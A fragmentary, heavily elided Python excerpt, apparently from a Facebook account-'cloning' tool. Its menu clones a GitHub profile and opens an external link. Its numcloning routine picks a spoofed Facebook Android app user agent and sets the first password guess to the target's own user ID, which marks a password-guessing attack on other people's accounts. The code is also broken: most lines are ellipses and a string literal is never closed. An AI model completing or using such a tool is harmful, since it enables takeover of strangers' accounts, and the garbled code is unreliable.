...
def main_input():
    ...
    if mx=='1':
        ...
        os.system("git clone https://github.com/MRRAKIB404")
        ...
        os.system("xdg-open wp.me+9660531382117")
        time.sleep(3)
        main_system()
...
def numcloning():
    ...
    def main(arg):
        user = arg
        lines = random.choice([
			"Mozilla/5.0 (Linux; Android 11; vivo 1901 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/354.0.0.22.110;]
		])
        try:
            pass1 = user
